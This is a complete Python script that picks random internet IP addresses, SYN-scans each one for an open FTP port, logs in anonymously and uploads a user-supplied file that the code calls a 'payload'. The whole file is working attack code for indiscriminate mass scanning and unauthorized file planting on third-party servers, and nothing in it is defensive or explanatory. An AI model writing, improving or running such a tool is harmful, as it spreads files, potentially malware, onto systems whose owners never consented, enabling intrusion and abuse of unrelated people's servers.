#!/usr/bin/env python3
import sys, os, random, string, ftplib, time
from scapy.all import sr1, IP, TCP

def _scan(_ip):
    _probe = False
    
    try:
        response = sr1(IP(dst=_ip)/TCP(dport=21, flags="S"), timeout=int(sys.argv[2]), verbose=False)
        
        if response and response.haslayer(TCP):
            if response[TCP].flags == 0x12:
                # 0x12 = syn/ack response
                _probe = True
    except Exception as e:
        print(e)
        
    return _probe

def _auth(_ip):
    _login = False
    
    try:
        # establish ftp session
        ftp = ftplib.FTP(_ip)
        
        # attempt anonymous login
        ftp.login()
        
        # write payload to server
        with open(sys.argv[1], 'rb') as file:
            ftp.storbinary(f'STOR {os.path.basename(sys.argv[1])}', file)
            
        # kill ftp session
        ftp.quit()
        
        _login = True
    except:
        pass

    return _login

def main():
    os.system('clear')
    
    # force privilege elevation
    if os.geteuid() != 0:
        sys.exit('Script requires root elevation...')
    
    # confirm scan parameters are set
    if len(sys.argv) != 3:
        sys.exit('Syntax: <file-path> <timeout-sec>')
    
    # ensure payload exists
    if not os.path.isfile(sys.argv[1]):
        sys.exit('\r\nFile not found! Exiting...\r\n')
    
    # begin scan
    try:
        while True:
            # generate ip address
            _ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
            print(f'Probing {_ip}:21...')
            
            # syn probe to confirm ftp is open
            _probe = _scan(_ip)
            
            if _probe: # ftp found...
                print('---> FTP open! Attempting payload injection...')
                
                # attempt ftp login / file upload
                _inject = _auth(_ip)
                
                if _inject:
                    # verbose confirmation of payload delivery
                    print('     Success! Payload uploaded anonymously to server...')
            
    except KeyboardInterrupt:
        sys.exit('\r\nScan complete.')
        
if __name__ == '__main__':
    main()
